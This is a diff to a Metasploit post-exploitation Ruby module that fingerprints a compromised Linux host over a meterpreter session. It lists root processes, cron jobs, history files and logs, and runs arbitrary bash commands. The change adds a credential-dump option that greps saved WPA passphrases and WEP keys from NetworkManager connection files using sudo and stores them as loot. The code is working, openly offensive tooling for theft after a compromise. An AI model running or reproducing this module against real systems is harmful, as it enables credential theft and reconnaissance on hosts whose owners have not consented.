@@ -15,17 +15,17 @@
 #
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
-# This module gathers target system information (linux distros), display outputs
-# and stores it into a logfile in msf4/loot folder. this module also allows users
-# to execute a single_command in bash + read/store outputs (advanced options).
-# HINT: This module requires root privileges to run in non-Kali distros ..
+# This module gathers target system information (linux distros), dump remote credentials
+# display outputs and stores it into a logfile in msf4/loot folder. this module also allows
+# users to execute a single_command in bash + read/store outputs (advanced options).
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on       => set SESSION 3
-# Store dumped data to msf4/loot folder?         => set STORE_LOOT true
-# Agressive system fingerprints scan?            => set AGRESSIVE_DUMP true
-# The bash command to execute remotly            => set SINGLE_COMMAND uname -a
+# The session number to run this module on => set SESSION 3
+# Store dumped data to msf4/loot folder?   => set STORE_LOOT true
+# Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
+# Dump remote credentials from target?     => set CREDENTIALS_DUMP true
+# The bash command to execute remotly      => set SINGLE_COMMAND uname -a
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'linux hostrecon post-module (fingerprints)',
                         'Description'   => %q{
-                                        This module gathers target system information (linux distros), display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
+                                        This module gathers target system information (linux distros) dump remote credentials, display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -100,10 +100,10 @@ class MetasploitModule < Msf::Post
                                 ],
  
                         'Version'        => '$Revision: 1.2',
-                        'DisclosureDate' => 'set 17 2017',
+                        'DisclosureDate' => 'set 25 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'true',  # root privs required
+                        'Privileged'     => 'true',  # root privileges required
                         'Targets'        =>
                                 [
                                          [ 'Linux' ]
@@ -133,10 +133,12 @@ class MetasploitModule < Msf::Post
                         [
                                 OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
-                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotly'])
+                                OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
+                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotelly'])
                         ], self.class)
  
         end
+
 
 
 #
@@ -149,23 +151,21 @@ def run
   #
   # draw module banner ..
   #
-  print_line("    +----------------------------+")
-  print_line("    |LINUX HOSTRECON POST-MODULE |")
-  print_line("    |   Author : r00t-3xp10it    |")
-  print_line("    +----------------------------+")
+  print_line("+-----------------------------+")
+  print_line("| LINUX HOSTRECON POST-MODULE |")
+  print_line("|    Author : r00t-3xp10it    |")
+  print_line("+-----------------------------+")
+
 
 
     #
-    # Variable declarations (msf API calls)
+    # Local variable declarations (msf API calls)
     #
     sys_info = session.sys.config.sysinfo
-    target_uid = client.sys.config.getuid
     host_ip = client.session_host
     payload_path = client.fs.dir.pwd
     #
     # check for proper target operative system (Linux)
-    # here we are using sysinfo['OS'] meterpreter module to check if target
-    # system its compatible with the exploit code (linux distros only)
     #
     unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
       print_error("[ABORT]: This module only works againt Linux systems")
@@ -173,7 +173,6 @@ def run
     end
     #
     # Check if we are running in an higth integrity context (root)
-    # here we are using getuid API to check for root privileges 
     #
     target_uid = client.sys.config.getuid
     unless target_uid =~ /uid=0/ || target_uid =~ /root/
@@ -204,18 +203,19 @@ def run
       #
       date_out = cmd_exec("date")
       distro_uname = cmd_exec("uname -a")
-      distro_release = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='")
+      current_shell = cmd_exec("echo $0")
+      system_shell = cmd_exec("echo \"$SHELL\"")
+      distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
       hardware_bits = cmd_exec("lscpu | grep 'CPU op-mode'")
       hardware_vendor = cmd_exec("lscpu | grep 'Vendor ID'")
-      current_shell = cmd_exec("echo $0")
-      system_shell = cmd_exec("echo $SHELL")
-      distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
+      distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='")
+      distro_mem = cmd_exec("cat /proc/meminfo | grep \"MemTotal\"; cat /proc/meminfo | grep \"MemFree\"; cat /proc/meminfo | grep \"MemAvailable\"; cat /proc/meminfo | grep \"Dirty\"")
         #
-        # Store data into an variable (data_dump) ..
+        # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
         data_dump << "[*] " + date_out
-        data_dump << "\n\n"
+        data_dump << "\n\n\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
@@ -226,8 +226,12 @@ def run
         data_dump << "Client UID          : #{target_uid}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
         data_dump << "Distro uname        : #{distro_uname}\n"
-        data_dump << "Distro release      : #{distro_release}\n"
+        data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "\n\n\n"
+        data_dump << "MEMORY STATS\n"
+        data_dump << "------------\n"
+        data_dump << distro_mem
+        data_dump << "\n\n"
         data_dump << "CURRENT SHELL\n"
         data_dump << "-------------\n"
         data_dump << current_shell
@@ -239,7 +243,8 @@ def run
         data_dump << "AVAILABLE SHELLS\n"
         data_dump << "----------------\n"
         data_dump << distro_shells
-        data_dump << "\n\n"
+        data_dump << "\n\n\n"
+
 
 
         #
@@ -252,21 +257,14 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          cron_tasks = cmd_exec("ls -la /etc/cron*")
           root_services = cmd_exec("ps -aux | grep '^root'")
-          distro_packages = cmd_exec("/usr/bin/dpkg -l")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-          cron_tasks = cmd_exec("ls -la /etc/cron*")
-          # Store interface in use (remote)
-          interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
-          # Executing interface scans (essids emitting)
-          essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
-          Rex::sleep(0.5)
             #
-            # store data into an variable (data_dump) ..
+            # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "\n"
             data_dump << "+------------------------+\n"
             data_dump << "| AGRESSIVE SCAN REPORTS |\n"
             data_dump << "+------------------------+\n"
@@ -274,10 +272,6 @@ def run
             data_dump << "ROOT SERVICES RUNNING\n"
             data_dump << "---------------------\n"
             data_dump << root_services
-            data_dump << "\n\n"
-            data_dump << "LIST OF PACKAGES FOUND\n"
-            data_dump << "----------------------\n"
-            data_dump << distro_packages
             data_dump << "\n\n"
             data_dump << "LIST OF HISTORY FILES\n"
             data_dump << "---------------------\n"
@@ -290,12 +284,44 @@ def run
             data_dump << "CRONTAB TASKS\n"
             data_dump << "-------------\n"
             data_dump << cron_tasks
-            data_dump << "\n\n"
-            data_dump << "LIST OF ESSIDs EMITING\n"
-            data_dump << "----------------------\n"
-            data_dump << essid_out
-            data_dump << "\n\n"
+            data_dump << "\n\n\n"
         end
+
+
+
+        #
+        # dump credentials from target ..
+        # if sellected previous in advanced options (set CREDENTIALS_DUMP true) ..
+        #
+        if datastore['CREDENTIALS_DUMP'] == true
+          print_status("Dumping remote credentials from target ..")
+          Rex::sleep(0.5)
+          #
+          # bash commands to be executed remotelly ..
+          #
+          # Store target interface in use (remote)
+          interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
+          # Dump target WIFI credentials stored ..
+          wpa_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
+          wep_out = cmd_exec("sudo grep wep-key0= /etc/NetworkManager/system-connections/*")
+            #
+            # store data into a local variable (data_dump) ..
+            # to be able to write the logfile and display the outputs ..
+            #
+            data_dump << "+------------------------+\n"
+            data_dump << "| REMOTE CREDENTIALS DUMP|\n"
+            data_dump << "+------------------------+\n"
+            data_dump << "\n\n"
+            data_dump << "WPA CREDENTIALS:\n"
+            data_dump << "----------------\n"
+            data_dump << wpa_out
+            data_dump << "\n\n"
+            data_dump << "WEP CREDENTIALS:\n"
+            data_dump << "----------------\n"
+            data_dump << wep_out
+            data_dump << "\n\n\n"
+        end
+
 
 
         #
@@ -307,22 +333,20 @@ def run
         if not exec_bash.nil?
           print_status("Running a single bash command ..")
           Rex::sleep(0.5)
-          #
-          # bash commands to be executed remotelly ..
-          #
+          # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
-          Rex::sleep(0.5)
             #
-            # store data into an variable (data_dump) ..
+            # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "\n"
             data_dump << "+-------------------------+\n"
             data_dump << "| COMMAND EXECUTED OUTPUT |\n"
             data_dump << "+-------------------------+\n"
             data_dump << single_comm
-            data_dump << "\n\n"
+            data_dump << "\n\n\n"
         end
+
+
 
        #
        # All scans finished ..
@@ -341,7 +365,7 @@ def run
        #
        # print the contents of 'data_dump' variable ..
        #
-       Rex::sleep(0.5)
+       Rex::sleep(1.5)
        print_line("")
        print_line(data_dump)
        print_line("")
